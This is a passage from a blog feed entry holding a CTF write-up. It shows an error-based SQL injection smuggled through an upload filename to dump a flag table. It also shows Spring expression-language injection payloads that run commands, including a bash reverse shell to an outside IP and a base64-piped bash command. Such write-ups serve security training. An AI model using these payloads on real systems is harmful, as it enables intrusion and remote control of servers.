src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651044108270-69859d13-6910-422d-a90f-2cdc7cf452be.png#clientId=uef842dd6-0d55-4&amp;from=paste&amp;height=249&amp;id=u9a50f334&amp;originHeight=807&amp;originWidth=1878&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=163296&amp;status=done&amp;style=none&amp;taskId=ufd14b0af-8b51-4948-8bca-373f303147f&amp;title=&amp;width=579" alt="image.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.24.150:8001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------32425959201085509701569429780</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>295</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://124.222.24.150:8001</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://124.222.24.150:8001/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32425959201085509701569429780</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upfile&quot;</span>; filename=<span class="string">&quot;1.php&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and &#x27;1&#x27;=&#x27;1&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: ctf</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span>info();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32425959201085509701569429780</span>--</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php&#x27; and (updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.24.150:8001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------32425959201085509701569429780</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>313</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://124.222.24.150:8001</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://124.222.24.150:8001/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32425959201085509701569429780</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upfile&quot;</span>; filename=<span class="string">&quot;1.php&#x27; and (updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)) and &#x27;1&#x27;=&#x27;1&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: ctf</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span>info();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">32425959201085509701569429780</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650962637310-25612d25-c647-4daf-9c9d-10eddbf8b9ac.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=603&amp;id=u904e356b&amp;originHeight=754&amp;originWidth=1880&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=136122&amp;status=done&amp;style=none&amp;taskId=u16f2fdd2-8eb8-435f-931c-532952bb24b&amp;title=&amp;width=1504" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650963472268-33c5cf65-365b-495b-9a0c-77394c55c055.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=511&amp;id=ue9e26e78&amp;originHeight=639&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=147976&amp;status=done&amp;style=none&amp;taskId=u1115f3d6-7e9f-4447-b8b9-6b792b53867&amp;title=&amp;width=1152" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650963494728-b1a5749c-ab6b-4e47-9f15-9cb9f896b925.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=501&amp;id=uabc58fbc&amp;originHeight=626&amp;originWidth=1442&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=146401&amp;status=done&amp;style=none&amp;taskId=uf14be657-9e1d-4db7-83dc-8826eb55bb7&amp;title=&amp;width=1153.6" alt="image.png"><br />flag{5937a0b90b5966939cccd369291c68aa}<br><a href=""><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="20220428_101854.mp4 (19.74MB)"></a><a name="OCcZb"></a></p><h3 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650971287517-51292361-bbbd-498c-92cc-cee3fc3bdddd.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=194&amp;id=u759c1508&amp;originHeight=641&amp;originWidth=1700&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=111368&amp;status=done&amp;style=none&amp;taskId=u60843944-f6b8-4165-9a97-2b00f38ba6e&amp;title=&amp;width=514" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650976758481-3fd281c4-aa5d-4fab-b5c0-0ede68711bbf.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=234&amp;id=ua5eb816c&amp;originHeight=587&amp;originWidth=973&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=43564&amp;status=done&amp;style=none&amp;taskId=u91a15bdd-7e0f-4930-9437-1caa08b5eac&amp;title=&amp;width=387.20001220703125" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650976626630-68d2b497-8601-429c-bd6e-8600cdbdebab.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=318&amp;id=u1963a1ee&amp;originHeight=678&amp;originWidth=1046&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=57512&amp;status=done&amp;style=none&amp;taskId=u661e9918-ce82-466a-bab5-d45f4df49f5&amp;title=&amp;width=491.20001220703125" alt="image.png"><br />同样的方式 down 下来</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=#&#123;T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp;/dev/tcp/146.56.149.227/10022 0&gt;&amp;1&quot;&#125;)&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test388</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.173.163:8022</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=8238F74DDCDE5A0ED8C862BC1D78B1DA</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>977</span><br><span class="line"></span><br><span class="line"><span class="language-stylus">name=#&#123;<span class="built_in">T</span>(String)<span class="selector-class">.getClass</span>()<span class="selector-class">.forName</span>(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)<span class="selector-class">.getMethod</span>(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,<span class="built_in">T</span>(String<span class="selector-attr">[]</span>))<span class="selector-class">.invoke</span>(<span class="built_in">T</span>(String)<span class="selector-class">.getClass</span>()<span class="selector-class">.forName</span>(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)<span class="selector-class">.getMethod</span>(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>)<span class="selector-class">.invoke</span>(<span class="built_in">T</span>(String)<span class="selector-class">.getClass</span>()<span class="selector-class">.forName</span>(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),new String<span class="selector-attr">[]</span>&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp;/dev/tcp/VPS/10022 0&gt;&amp;1&quot;</span>&#125;)&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650974620811-b2d81980-5258-41e2-bd5f-f04f5cec0dcb.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=248&amp;id=u7e74a0ea&amp;originHeight=786&amp;originWidth=1889&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=171052&amp;status=done&amp;style=none&amp;taskId=ud6503f5a-bf78-4795-9368-0306a81873d&amp;title=&amp;width=595.2000122070312" alt="image.png"></p><p>还有一种方式<br />payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test388</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.173.163:8022</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=8238F74DDCDE5A0ED8C862BC1D78B1DA</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>290</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">name=#&#123;<span class="constructor">T(String)</span>.get<span class="constructor">Class()</span>.<span class="keyword">for</span><span class="constructor">Name(<span class="string">&quot;java.l&quot;</span>%2b<span class="string">&quot;ang.Ru&quot;</span>%2b<span class="string">&quot;ntime&quot;</span>)</span>.get<span class="constructor">Method(<span class="string">&quot;ex&quot;</span>%2b<span class="string">&quot;ec&quot;</span>,T(String[])</span>).invoke(<span class="constructor">T(String)</span>.get<span class="constructor">Class()</span>.<span class="keyword">for</span><span class="constructor">Name(<span class="string">&quot;java.l&quot;</span>%2b<span class="string">&quot;ang.Ru&quot;</span>%2b<span class="string">&quot;ntime&quot;</span>)</span>.get<span class="constructor">Method(<span class="string">&quot;getRu&quot;</span>%2b<span class="string">&quot;ntime&quot;</span>)</span>.invoke(<span class="constructor">T(String)</span>.get<span class="constructor">Class()</span>.<span class="keyword">for</span><span class="constructor">Name(<span class="string">&quot;java.l&quot;</span>%2b<span class="string">&quot;ang.Ru&quot;</span>%2b<span class="string">&quot;ntime&quot;</span>)</span>),<span class="keyword">new</span> String<span class="literal">[]</span>&#123;<span class="string">&quot;whoami&quot;</span>&#125;)&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650976025209-06e833a3-7be1-4113-8fe1-0f6668b5f689.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=303&amp;id=ub1f8d9cd&amp;originHeight=721&amp;originWidth=1481&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=159247&amp;status=done&amp;style=none&amp;taskId=ufb9c85d6-66b2-4f7f-801b-1bca73a730a&amp;title=&amp;width=623.2000122070312" alt="image.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test388</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.173.163:8022</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=8238F74DDCDE5A0ED8C862BC1D78B1DA</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>203</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">name=#&#123;<span class="keyword">new</span> java.io.<span class="constructor">BufferedReader(<span class="params">new</span> <span class="params">java</span>.<span class="params">io</span>.InputStreamReader(<span class="params">new</span> ProcessBuilder(<span class="params">new</span> String[]&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;&#123;echo,bHMgL3xiYXNlNjQ=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span>.start<span class="literal">()</span>.get<span class="constructor">InputStream()</span>, <span class="string">&quot;gbk&quot;</span>)).read<span class="constructor">Line()</span>&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650976108896-c2e4dffc-44c9-4454-ae57-152e4eb7a6e3.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=273&amp;id=P4xlS&amp;originHeight=718&amp;originWidth=1481&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=156090&amp;status=done&amp;style=none&amp;taskId=ua3267f05-cce2-456b-a9ab-e1ee6758401&amp;title=&amp;width=562.2000122070312" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650976145931-2679f2cb-bcfa-488a-b9ca-b4d734690d3d.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=203&amp;id=uc09cf2fb&amp;originHeight=409&amp;originWidth=1210&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=16979&amp;status=done&amp;style=none&amp;taskId=uf8735c3e-b43a-4b6c-a668-64ad903d761&amp;title=&amp;width=601.2000122070312" alt="image.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test388</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.173.163:8022</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=8238F74DDCDE5A0ED8C862BC1D78B1DA</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>161</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">name=#&#123;<span class="keyword">new</span> java.io.<span class="constructor">BufferedReader(<span class="params">new</span> <span class="params">java</span>.<span class="params">io</span>.InputStreamReader(<span class="params">new</span> ProcessBuilder(<span class="params">new</span> String[]&#123;<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;/f1AgJvav&quot;</span>&#125;)</span>.start<span class="literal">()</span>.get<span class="constructor">InputStream()</span>, <span class="string">&quot;gbk&quot;</span>)).read<span class="constructor">Line()</span>&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650976311217-05a3d4d4-650c-48c9-abb1-7ceb8312759f.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=464&amp;id=u707538c6&amp;originHeight=580&amp;originWidth=1463&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=122199&amp;status=done&amp;style=none&amp;taskId=ub5253a9c-0e1a-4454-b9d6-dcc610aa515&amp;title=&amp;width=1170.4" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;CTF/2022-第二届网刃杯/images/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;br&gt;&lt;a name=&quot;kTMJT&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ICS&quot;&gt;&lt;a href=&quot;#ICS&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://nack0c.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
